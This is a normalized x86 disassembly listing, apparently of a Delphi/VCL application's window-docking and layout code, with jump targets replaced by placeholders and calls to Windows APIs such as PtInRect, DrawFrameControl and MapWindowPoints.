mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44aae0
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4497c4
mov eax [ esi + 0x64 ]
call sub_449410
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44aae0
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4497c4
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_44ae64
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4497c4
mov eax [ esi + 0x64 ]
call sub_449410
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_44af98
xor edx edx
mov eax esi
call sub_4497c4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_449438
adc edx 0x0
mov eax ebx
call sub_4490f8
mov eax ebx
call sub_449488
push esi
push sub_44af98
xor edx edx
mov eax esi
call sub_4497c4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_449c18
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_4490f8
mov eax [ ebx + 0x14 ]
call sub_449488
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_449c90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_449410
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_449410
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_449410
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_448fdc
mov esi eax
mov edx 0x2
mov eax ebx
call sub_448fdc
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_449410
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_4494e8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_449510
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4494e8
call sub_449c90
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_449510
call sub_449c90
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_449048
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_449048
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_449ebc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_443dbc
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_443d80
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_418d40
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449f50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_449ebc
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_449510
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44975c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_449510
call sub_449c90
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_449fd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403f6c
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4045b8
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_44a020
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44a218
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_44a6f0
mov eax [ ebp - 0x8 ]
call sub_4496ec
xor edx edx
push ebp
push sub_44a1fb
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a202
mov eax [ ebp - 0x8 ]
call sub_4496f0
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448ec4
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_449fd8
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403418
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4491e4
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_449fd8
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_4407c4
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_4415a4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_40321c
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_44a228
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_418d68
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423dcc
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a280
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_4233a4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_423b00
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_423aa0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_423aa0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_4233a4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_423aa0
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_423aa0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44a308
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_44a228
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_44a280
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_44a280
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_44a228
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_44a280
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_44a280
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_44a3e4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44a53a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43f480
mov eax [ ebp - 0x4 ]
call sub_423ad8
xor eax eax
push ebp
push sub_44a51d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423e4c
xor eax eax
push ebp
push sub_44a500
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_443dbc
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a507
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_423e4c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_443d80
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_440244
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44a548
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_445bbc
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4402ec
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_4402a8
mov ecx eax
xor edx edx
xor eax eax
call sub_418d68
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_4470c4
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418d90
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_44a6bc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44a6bc
pop ecx
mov eax ebx
call sub_40321c
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44a6bc
pop ecx
sub_44a6f0
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_44a6bc
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_40321c
xor eax eax
mov [ esi + 0x64 ] eax
sub_44a74c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44975c
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_44a788
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44a788
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44a9f5
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e60
mov edx [ ebp - 0x8 ]
pop eax
call sub_404234
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
mov eax [ ebx + 0x14 ]
call sub_448ee8
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e60
mov edx [ ebp - 0x10 ]
pop eax
call sub_404234
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_40321c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a9fc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f90
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_449298
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_449410
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_44944c
mov eax [ ebx + 0x18 ]
call sub_449298
mov [ edx + 0x18 ] eax
push esi
push sub_44af98
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4497c4
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_44944c
mov eax [ esi + 0x64 ]
call sub_449410
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_40321c
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_44af70
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_40321c
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_448f94
mov edx eax
mov eax edi
call sub_449438
mov eax edi
call sub_449298
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
